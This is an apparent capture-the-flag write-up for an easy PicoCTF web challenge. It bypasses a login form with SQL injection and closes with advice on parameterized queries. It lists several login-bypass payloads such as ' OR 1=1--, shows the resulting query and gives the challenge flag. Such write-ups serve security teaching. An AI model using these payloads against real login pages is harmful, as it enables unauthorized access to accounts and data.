# SQL Injection - Login Bypass

## Challenge Information

- **Platform**: PicoCTF
- **Category**: Web
- **Difficulty**: Easy
- **Points**: 100
- **Author**: PicoCTF Team
- **Date Solved**: 2024-01-15

## Description

```
Can you bypass the login page?
http://challenge.picoctf.org:12345/login
```

## Tools Used

- Web Browser
- Burp Suite (optional)
- curl

## Solution

### Step 1: Analyze the Login Form

The challenge presents a simple login form with username and password fields.

```html
<form method="POST" action="/login">
  <input type="text" name="username">
  <input type="password" name="password">
  <button type="submit">Login</button>
</form>
```

### Step 2: Test for SQL Injection

Try basic SQL injection payloads in the username field:

```sql
admin' OR '1'='1
admin' --
admin' #
```

### Step 3: Successful Bypass

The payload `admin' OR '1'='1' --` successfully bypasses authentication.

**Explanation:**
The backend query likely looks like:
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
```

This always evaluates to true because `'1'='1'` is always true.

### Step 4: Retrieve Flag

After successful login, the flag is displayed on the dashboard.

```
Flag: picoCTF{sql_injection_is_not_secure}
```

## Alternative Solutions

**Method 2: Comment-based bypass**
```sql
admin'--
```

**Method 3: Boolean bypass**
```sql
' OR 1=1--
```

## Key Learnings

- SQL injection occurs when user input is not properly sanitized
- Always validate and sanitize user inputs
- Use parameterized queries (prepared statements)
- Never trust user input

## Prevention

```python
# BAD - Vulnerable to SQLi
query = f"SELECT * FROM users WHERE username='{username}'"

# GOOD - Using parameterized queries
cursor.execute("SELECT * FROM users WHERE username=?", (username,))
```

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)

## Tags

`sql-injection` `authentication-bypass` `easy` `web`

---

**Solved by**: Chetan Biranje  
**Date**: 2024-01-15  
**Time Taken**: 30 minutes
